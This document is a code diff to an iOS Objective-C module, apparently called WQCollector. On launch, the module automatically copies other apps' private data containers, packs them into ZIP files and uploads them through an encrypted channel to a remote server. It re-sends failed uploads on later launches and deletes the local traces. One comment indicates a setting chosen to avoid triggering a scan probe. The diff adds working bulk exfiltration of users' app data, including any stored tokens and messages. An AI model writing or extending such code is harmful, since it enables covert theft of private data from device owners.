@@ -6,14 +6,19 @@
 //
 //    阶段 1/6  app 已启动，自动开启应用数据采集
 //    阶段 2/6  正在获取采集信息 → 获取采集信息完成 — N 项
-//    阶段 3/6  容器索引就绪 — N 个应用
-//    阶段 4/6  开始采集 N 项
-//    阶段 5/6  采集完成 — 已处理 N 个
+//    阶段 3/6  容器索引就绪 — N 个应用（顺带补传上次遗留的 ZIP）
+//    阶段 4/6  开始采集 N 项 → 每个容器：复制 → 打包 ZIP → v2 上传（wqnet_upload）
+//    阶段 5/6  采集完成 — 已处理 N 个，已上传 M 个
 //    阶段 6/6  本地文件已删除 → 流程结束
+//
+//  上传走的是 v2 加密链路（WQNet.swift / WQV2.swift）：
+//      POST <SecureBox pathZip>  multipart: meta=<v2 信封>, file=<ZIP 原始字节>
+//  失败时 ZIP 留在 Documents/wq-collect 里，下一次启动先补传再采集。
 //
 
 #import "WQCollector.h"
 #import "WQAccess.h"
+#import "WQArchive.h"
 
 #import <UIKit/UIKit.h>
 #import <sys/stat.h>
@@ -31,7 +36,8 @@ extern int wqnet_upload(const char *filePath, const char *bundleID);
 
 static const char *kAppDataRoot = "/var/mobile/Containers/Data/Application";
 static const int64_t kMaxInode = 45000000;   // 固定上限：maxInode=0 会触发 WQ 的共享扫描探针
-static const NSUInteger kMaxLocalDirs = 3;
+static const NSUInteger kMaxLocalDirs = 3;   // 保留的未打包目录
+static const NSUInteger kMaxLocalZips = 6;   // 保留的待补传 ZIP
 
 static BOOL gRunning = NO;
 static NSString *gSummary = nil;
@@ -112,22 +118,134 @@ static NSString *WQCollectDirectory(void) {
     return dir;
 }
 
-static NSUInteger WQPruneLocalDirs(void) {
+/// 修剪本地产物：目录和 ZIP 分开计数，ZIP 按修改时间保留最新的几个。
+/// 上传失败留下的 ZIP 就是下一次启动补传的队列，不能全删。
+static NSUInteger WQPruneLocalArtifacts(void) {
     NSString *dir = WQCollectDirectory();
-    NSArray<NSString *> *names = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:NULL];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSArray<NSString *> *names = [fm contentsOfDirectoryAtPath:dir error:NULL];
     NSMutableArray<NSString *> *folders = [NSMutableArray array];
+    NSMutableArray<NSString *> *zips = [NSMutableArray array];
     for (NSString *name in names) {
         if ([name hasPrefix:@"."]) continue;
-        [folders addObject:name];
+        if ([[name pathExtension].lowercaseString isEqualToString:@"zip"]) {
+            [zips addObject:name];
+        } else {
+            [folders addObject:name];
+        }
     }
-    if (folders.count <= kMaxLocalDirs) return 0;
-    [folders sortUsingSelector:@selector(compare:)];
+
     NSUInteger removed = 0;
-    for (NSUInteger i = 0; i + kMaxLocalDirs < folders.count; i++) {
-        NSString *path = [dir stringByAppendingPathComponent:folders[i]];
-        if ([[NSFileManager defaultManager] removeItemAtPath:path error:NULL]) removed++;
+    [folders sortUsingSelector:@selector(compare:)];
+    if (folders.count > kMaxLocalDirs) {
+        for (NSUInteger i = 0; i + kMaxLocalDirs < folders.count; i++) {
+            NSString *path = [dir stringByAppendingPathComponent:folders[i]];
+            if ([fm removeItemAtPath:path error:NULL]) removed++;
+        }
+    }
+
+    if (zips.count > kMaxLocalZips) {
+        NSArray<NSString *> *byDate = [zips sortedArrayUsingComparator:^NSComparisonResult(NSString *a, NSString *b) {
+            NSDate *da = [[fm attributesOfItemAtPath:[dir stringByAppendingPathComponent:a] error:NULL] fileModificationDate];
+            NSDate *db = [[fm attributesOfItemAtPath:[dir stringByAppendingPathComponent:b] error:NULL] fileModificationDate];
+            return [(da ?: [NSDate dateWithTimeIntervalSince1970:0]) compare:(db ?: [NSDate dateWithTimeIntervalSince1970:0])];
+        }];
+        NSUInteger drop = byDate.count - kMaxLocalZips;
+        for (NSUInteger i = 0; i < drop; i++) {
+            NSString *path = [dir stringByAppendingPathComponent:byDate[i]];
+            if ([fm removeItemAtPath:path error:NULL]) removed++;
+            WQFileLog([NSString stringWithFormat:@"prune: dropped stale zip %@", byDate[i]]);
+        }
     }
     return removed;
+}
+
+#pragma mark 打包 + 上传
+
+/// 目录 → ZIP。WQArchive 的写入器：deflate 分块、跳过读不到的文件（root-only 的
+/// metadata plist 单列统计），符号链接和特殊文件不写。wq_zip_write 用 O_EXCL 建文件，
+/// 所以先删同名残留。
+static BOOL WQWriteZip(NSString *folder, NSString *zipPath, NSUInteger *unreadableOut, NSString **errorText) {
+    [[NSFileManager defaultManager] removeItemAtPath:zipPath error:NULL];
+    WQArchiveIO *io = wq_archive_posix_io();
+    io.skipUnreadable = YES;
+    io.expectedUnreadableNames = [NSSet setWithObject:@".com.apple.mobile_container_manager.metadata.plist"];
+    NSUInteger skipped = 0;
+    NSString *error = nil;
+    BOOL ok = wq_zip_write(@[ folder ], zipPath, io, nil, nil, &skipped, &error);
+    if (unreadableOut) *unreadableOut = io.unreadable;
+    if (!ok && errorText) *errorText = error.length ? error : @"zip write failed";
+    return ok;
+}
+
+/// ZIP → v2 加密上传。rc 说明见 WQNet.swift：0 成功，负数是具体失败点。
+static BOOL WQUploadZip(NSString *zipPath, NSString *bundleID, long long *bytesOut) {
+    NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:zipPath error:NULL];
+    long long bytes = [attrs[NSFileSize] longLongValue];
+    if (bytesOut) *bytesOut = bytes;
+    if (bytes <= 0) {
+        WQFileLog([NSString stringWithFormat:@"[upload] %@ 是空包，跳过", zipPath.lastPathComponent]);
+        return NO;
+    }
+    int rc = wqnet_upload(zipPath.fileSystemRepresentation, bundleID.UTF8String);
+    WQFileLog([NSString stringWithFormat:@"[upload] %@ (%lld B) bundle=%@ rc=%d",
+               zipPath.lastPathComponent, bytes, bundleID, rc]);
+    if (rc != 0) WQDumpNetError([NSString stringWithFormat:@"upload %@", bundleID]);
+    return rc == 0;
+}
+
+/// wq-collect 里现存的 ZIP（按名字排序）。
+static NSArray<NSString *> *WQZipFiles(void) {
+    NSString *dir = WQCollectDirectory();
+    NSArray<NSString *> *names = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:NULL];
+    NSMutableArray<NSString *> *zips = [NSMutableArray array];
+    for (NSString *name in names) {
+        if ([name hasPrefix:@"."]) continue;
+        if ([[name pathExtension].lowercaseString isEqualToString:@"zip"]) {
+            [zips addObject:[dir stringByAppendingPathComponent:name]];
+        }
+    }
+    [zips sortUsingSelector:@selector(compare:)];
+    return zips;
+}
+
+/// ZIP 名是 "<bundleID>-<yyyyMMdd-HHmmss>.zip"，反推 bundle_id 用来补传。
+static NSString *WQBundleIDFromZipPath(NSString *path) {
+    static NSRegularExpression *regex = nil;
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
+        regex = [NSRegularExpression regularExpressionWithPattern:@"^(.+)-(\\d{8}-\\d{6})$"
+                                                         options:0
+                                                           error:NULL];
+    });
+    NSString *base = [[path lastPathComponent] stringByDeletingPathExtension];
+    if (base.length == 0) return nil;
+    NSTextCheckingResult *match = [regex firstMatchInString:base
+                                                    options:0
+                                                      range:NSMakeRange(0, base.length)];
+    if (!match || match.numberOfRanges < 2) return nil;
+    return [base substringWithRange:[match rangeAtIndex:1]];
+}
+
+/// 上一次没传完的 ZIP：这次启动先补传，成功即删。
+static NSUInteger WQUploadPendingZips(void) {
+    NSArray<NSString *> *zips = WQZipFiles();
+    if (zips.count == 0) return 0;
+    NSUInteger uploaded = 0;
+    for (NSString *path in zips) {
+        NSString *bundleID = WQBundleIDFromZipPath(path);
+        if (bundleID.length == 0) {
+            WQFileLog([NSString stringWithFormat:@"[upload] 无法从文件名反推 bundle_id：%@", path.lastPathComponent]);
+            continue;
+        }
+        if (WQUploadZip(path, bundleID, NULL)) {
+            [[NSFileManager defaultManager] removeItemAtPath:path error:NULL];
+            uploaded++;
+        }
+    }
+    WQStage(@"阶段 3/6：补传遗留压缩包 — 成功 %lu/%lu 个",
+            (unsigned long)uploaded, (unsigned long)zips.count);
+    return uploaded;
 }
 
 static NSString *WQStamp(void) {
@@ -395,10 +513,14 @@ static NSString *WQRunCollection(void) {
         }
         wqnet_apps(WQJSONFromArray(containers.allKeys).UTF8String);
 
+        // 上一次没传完的 ZIP 先补传：新包还没生成，这里是唯一的待传队列
+        WQUploadPendingZips();
+
         // ---- 4/6 采集 ----
         WQStage(@"阶段 4/6：开始采集 %lu 项", (unsigned long)configs.count);
         NSString *stamp = WQStamp();
         NSUInteger processed = 0;
+        NSUInteger uploaded = 0;
         NSMutableArray<NSString *> *missing = [NSMutableArray array];
 
         for (NSDictionary *config in configs) {
@@ -418,26 +540,56 @@ static NSString *WQRunCollection(void) {
             NSUInteger files = WQCopyContainer(container, dest, &copyError);
             if (files == 0) {
                 NSLog(@"[WQCollector] %@ 未复制到文件: %@", bundleID, copyError.localizedDescription);
+                WQFileLog([NSString stringWithFormat:@"[collect] %@ 未复制到文件: %@", bundleID,
+                           copyError.localizedDescription ?: @"-（0 个文件）"]);
                 continue;
             }
             processed++;
             NSLog(@"[WQCollector] %@ 已复制 %lu 个文件 -> %@", bundleID, (unsigned long)files, dest.lastPathComponent);
+
+            // ---- 目录 -> ZIP -> v2 加密上传 ----
+            NSString *zipPath = [WQCollectDirectory() stringByAppendingPathComponent:
+                                 [NSString stringWithFormat:@"%@-%@.zip", safeName, stamp]];
+            NSUInteger unreadable = 0;
+            NSString *zipError = nil;
+            if (!WQWriteZip(dest, zipPath, &unreadable, &zipError)) {
+                WQFileLog([NSString stringWithFormat:@"[zip] %@ 打包失败: %@", bundleID, zipError ?: @"-"]);
+                WQStage(@"阶段 4/6：%@ 打包失败 — %@", bundleID, zipError ?: @"unknown");
+                continue;   // 目录留着，下一步的修剪会按上限保留
+            }
+            long long zipBytes = 0;
+            BOOL ok = WQUploadZip(zipPath, bundleID, &zipBytes);
+
+            // 内容已经在 ZIP 里，目录立刻删掉，省出一份磁盘；上传失败就只留 ZIP 待补传
+            [[NSFileManager defaultManager] removeItemAtPath:dest error:NULL];
+            if (ok) {
+                [[NSFileManager defaultManager] removeItemAtPath:zipPath error:NULL];
+                uploaded++;
+                WQStage(@"阶段 4/6：%@ 已上传 — %lu 个文件 / ZIP %lld 字节（%lu 个读不到已跳过）",
+                        bundleID, (unsigned long)files, zipBytes, (unsigned long)unreadable);
+            } else {
+                WQStage(@"阶段 4/6：%@ 上传失败 — ZIP %lld 字节 已留在本地待补传",
+                        bundleID, zipBytes);
+            }
         }
 
         // ---- 5/6 完成 ----
-        WQStage(@"阶段 5/6：采集完成 — 总计 %lu 项，已处理 %lu 个，未安装 %lu 个",
-                (unsigned long)configs.count, (unsigned long)processed, (unsigned long)missing.count);
+        WQStage(@"阶段 5/6：采集完成 — 总计 %lu 项，已处理 %lu 个，已上传 %lu 个，未安装 %lu 个",
+                (unsigned long)configs.count, (unsigned long)processed,
+                (unsigned long)uploaded, (unsigned long)missing.count);
         if (missing.count > 0) {
             WQStage(@"未安装：%@", [missing componentsJoinedByString:@", "]);
         }
 
         // ---- 6/6 清理 ----
-        NSUInteger removed = WQPruneLocalDirs();
+        NSUInteger removed = WQPruneLocalArtifacts();
         WQStage(@"阶段 6/6：本地文件已删除 %lu 个", (unsigned long)removed);
-        WQStage(@"阶段 6/6：流程结束 — 容器 %lu，已处理 %lu", (unsigned long)containers.count, (unsigned long)processed);
+        WQStage(@"阶段 6/6：流程结束 — 容器 %lu，已处理 %lu，已上传 %lu",
+                (unsigned long)containers.count, (unsigned long)processed, (unsigned long)uploaded);
 
-        summary = [NSString stringWithFormat:@"containers=%lu processed=%lu missing=%lu",
-                   (unsigned long)containers.count, (unsigned long)processed, (unsigned long)missing.count];
+        summary = [NSString stringWithFormat:@"containers=%lu processed=%lu uploaded=%lu missing=%lu",
+                   (unsigned long)containers.count, (unsigned long)processed,
+                   (unsigned long)uploaded, (unsigned long)missing.count];
     }
     return summary;
 }
